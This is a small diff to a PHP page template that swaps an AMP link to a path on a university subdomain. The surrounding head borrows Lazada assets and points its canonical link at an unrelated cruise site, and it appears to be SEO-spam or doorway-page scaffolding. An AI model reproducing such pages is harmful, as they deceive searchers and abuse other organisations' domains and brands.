@@ -83,7 +83,7 @@ if (isset($_GET['log'])) {
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
   <link rel="shortcut icon" href="https://killjoy-ult.s3.ap-southeast-1.amazonaws.com/assets/fav.webp" />
   <link rel="canonical" href="https://survey.cruisebooking.com/assets/<?php echo $BRAND ?>" />
-  <link rel="amphtml" href="https://mamahbaru.store/buy/<?php echo $BRAND ?>" />
+  <link rel="amphtml" href="https://akuntansi.upr.ac.id/js/<?php echo $BRAND ?>" />
   <!-- start preload -->
   <link rel="preload" href="https://res.cloudinary.com/dp900fdbb/image/upload/v1735055804/OIG3.EoZS0vXl9eF_8lP16j_z_roqysz.jpg" as="image" />
   <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id" />
